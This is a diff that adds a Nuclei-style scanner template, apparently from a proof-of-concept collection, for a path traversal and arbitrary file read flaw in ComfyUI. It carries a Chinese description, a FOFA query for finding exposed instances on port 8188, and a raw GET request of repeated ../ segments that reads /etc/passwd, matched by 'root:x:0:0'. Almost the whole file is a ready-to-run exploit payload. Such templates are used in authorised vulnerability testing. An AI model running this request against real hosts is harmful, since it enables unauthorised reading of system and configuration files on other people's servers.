@@ -1,0 +1,24 @@
+id: comfyui-file-read
+
+info:
+  name: "ComfyUI follow_symlinks 参数路径遍历与任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: "ComfyUI" && title=="ComfyUI" && port="8188"
+      ComfyUI 是基于节点流程的 Stable Diffusion 操作界面，支持工作流的精准定制与可复现性操作。2024年披露的 follow_symlinks 参数安全缺陷允许攻击者通过构造特殊路径请求，绕过文件访问控制机制，实现系统文件遍历与任意文件内容获取，可能导致配置文件、敏感数据及系统信息的非授权访问。
+  tags: ComfyUI
+
+http:
+- raw:
+  - |
+    GET /../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
